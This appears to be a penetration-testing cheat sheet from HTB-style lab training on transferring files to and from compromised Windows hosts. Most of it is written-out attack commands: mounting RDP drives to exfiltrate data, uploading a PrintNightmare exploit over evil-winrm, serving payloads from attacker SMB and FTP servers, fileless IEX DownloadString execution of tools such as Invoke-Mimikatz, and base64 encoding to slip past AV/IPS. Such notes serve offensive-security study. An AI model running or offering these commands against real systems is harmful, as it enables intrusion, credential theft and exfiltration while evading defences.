#### with RDP

- using xfreerdp clipboard to upload files to victim
- using xfreerdp to mount a shared folder so you can exfiltrate

```
xfreerdp /v:10.129.43.33 /u:vipa0z /p:"tester_password$#" /drive:share,/home/demise/tools/win
```

#### with WINRM

- using evil-winrm to upload files to victim while in session1

```
*Evil-WinRM* PS C:\programdata> upload /opt/i/CVE-2021-1675.ps1
```

4.  **Download with Custom User-Agent**

    ```powershell
    Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
    ```

---

## SMB Downloads

`start an smb server (attacker)`

```shell-session
sudo impacket-smbserver share -smb2support $(pwd) -u realm -password fckswe
```

authenticate to smb server

```
PS C:\Users\Public\Music> net use \\10.10.16.11\share /user:realm fckswe
The command completed successfully.
```

`copy files from attacker server`

```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe
```

New versions of Windows block unauthenticated guest access so that a windows host cant anonymously access any sort of share, create a secure smb channel on your attacking rig:

`Start an SMB Server with creds #attacker`

```shell-session
$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

`accesss smb share #victim (mounting maybe)`

```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test
```

---

### download using powershell

`webclient`

```powershell-session
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('http://10.10.16.19:80/backup.exe','backup.exe')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

`using invoke-webRequest`

```
Invoke-WebRequest -Uri http://10.10.16.5:8080/mag.ps1 -OutFile mag.ps1
```

confirm file exists after download:
`finding files via type *.ps1 `

```
Get-ChildItem -Recurse | Where-Object { $_.Name -like '*.ps1' }
```

`IEX (file-less execution after download) or Invoke-Expression with DownloadString`

`IEX #1`

```
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.19/backup.exe')
```

`pipe downloadString to IEX #2` try `invoke-mimikatz.ps1 from empire`

```
(New-ObjectNet.WebClient).DownloadString('link') | IEX
```

`Invoke web request:`
You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.

```powershell-session
PS C:\htb> Invoke-WebRequest <link> -OutFile PowerView.ps1 -UseBasicParsing
```

---

## Clipboard transfer

`integriti checks`

```shell-session
md5sum id_rsa
```

`base64 encoding to bypass simple AV/IPS rules`

```shell-session
attacker$ cat <clipboardcontent> |base64 -w 0;echo
```

`Decode File & store somewhere`

```powershell-session

[IO.File]::WriteAllBytes("#location-to-write",[Convert]::FromBase64String("#base64-string"))
```

`confirm md5sum:`

```powershell-session
Get-FileHash <PATH> -Algorithm md5
```

**Note:** While this method is convenient, it's not always possible to use. Windows Command Line utility `(cmd.exe)` has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

---

## download via FTP

---

```shell-session
$ sudo pip3 install pyftpdlib
```

`start ftp server`

```shell-session
$ sudo python3 -m pyftpdlib --port 21
```

`PowerShell, download from an ftp server`

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', '<locationtowrite')
```

`creating command file for ftp client #victim`

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

### more techniques:`

```
more transfer methods from harmjoy:
https://gist.github.com/HarmJ0y/bb48307ffa663256e239
```
